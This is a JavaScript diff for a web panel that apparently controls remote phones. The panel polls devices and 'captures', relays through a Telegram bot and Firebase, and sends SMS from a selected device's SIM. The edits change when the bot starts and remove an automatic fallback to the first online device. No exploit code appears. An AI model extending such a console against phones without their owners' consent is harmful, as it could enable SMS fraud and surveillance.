@@ -10,7 +10,7 @@ var CFG = window.SPECTER || {};
 var POLL_DEV      = CFG.POLL_DEV || 5000;
 var POLL_MSG      = 400;              /* ⚡ active device — 0.4s */
 var POLL_BAL      = CFG.POLL_BAL || 25000;
-var TG_LONGPOLL   = 12;
+var TG_LONGPOLL   = 8;
 var CLOUD_DEB     = 900;
 var SEARCH_DEB    = 220;
 var MSG_PAGE      = 80;
@@ -59,7 +59,7 @@ var _panelSyncTmr = null;
 var _serverTgPollTmr = null;
 var _capturePollTmr = null;
 var _lastCaptureAt = 0;
-var USE_SERVER_TG = true;
+var USE_SERVER_TG = false;
 
 /* ═══════ WATERMARKS ═══════ */
 var _watermarks = {};
@@ -455,6 +455,10 @@ window.addEventListener('error', function(e){
   console.warn('[Panel Error]', e.message);
 }, true);
 
+window.addEventListener('beforeunload', function(){
+  if(!USE_SERVER_TG) stopFastTelegram();
+});
+
 setTimeout(function(){ updateTgBtn(); }, 200);
 setInterval(function(){
   var m = document.getElementById('settingsModal');
@@ -568,7 +572,7 @@ function stopServerTgPollers(){
 
 /* ═══════ CLOUD CONFIG ═══════ */
 async function initCloudConfig(){
-  USE_SERVER_TG = CFG.serverTelegramBot !== false;
+  USE_SERVER_TG = CFG.serverTelegramBot === true;
   try{
     var cached = localStorage.getItem(CFG.LS_CACHE);
     if(cached){ userConfig = Object.assign({}, CFG.DEFAULT_CONFIG, JSON.parse(cached)); }
@@ -577,13 +581,7 @@ async function initCloudConfig(){
   setInterval(checkAutoBackup, 60000);
   if(USE_SERVER_TG) setInterval(function(){ if(FB_URL || userConfig.channelId) debouncedPanelSync(); }, 800);
 
-  /* ═══ AUTO-START TELEGRAM BOT if channelId is set ═══ */
-  setTimeout(function(){
-    if(userConfig.channelId && userConfig.botEnabled !== false && !tgRunning){
-      console.log('[TG] Auto-starting bot (channelId configured)');
-      startFastTelegram();
-    }
-  }, 1500);
+  /* Bot starts only when Firebase panel is connected (see connect()) */
 
   try{
     blobId = localStorage.getItem(CFG.LS_BLOB);
@@ -596,8 +594,7 @@ async function initCloudConfig(){
             cacheConfigLocal();
             updateCloudStatus('☁ Synced');
             /* After cloud sync, start bot if channelId was restored */
-            if(userConfig.channelId && userConfig.botEnabled !== false && !tgRunning){
-              console.log('[TG] Auto-starting bot after cloud sync');
+            if(FB_URL && userConfig.channelId && userConfig.botEnabled !== false && !tgRunning){
               startFastTelegram();
             }
           }
@@ -2331,17 +2328,11 @@ function routeChannelSms(number, message, msgObj){
   if(!passesRestriction(number, message, msgObj)){ console.log('[Route] blocked'); return; }
 
   var dev = getActiveDevice();
-  /* Fallback: first online */
   if(!dev){
-    dev = allDevices.find(function(d){ return d.status; }) || null;
-    if(dev){
-      console.log('[Route] no active → fallback ' + dev.name);
-      activeDeviceUid = (dev._fbId || 'primary') + '|||' + dev.id;
-      try{ localStorage.setItem(CFG.LS_ACTIVE || 'fbi_active_device', activeDeviceUid); }catch(e){}
-      renderGrid(true);
-    }
+    console.warn('[Route] No active device — open device modal first');
+    toast('⚠ Pehle device open karein (jo SMS bhejega)');
+    return;
   }
-  if(!dev){ console.warn('[Route] NO device'); toast('⚠ No device loaded'); return; }
   if(!dev.status){ console.warn('[Route] offline ' + dev.name); toast('⚠ ' + dev.name + ' offline'); return; }
 
   var sim = deviceSimMap[dev.id] || 1;
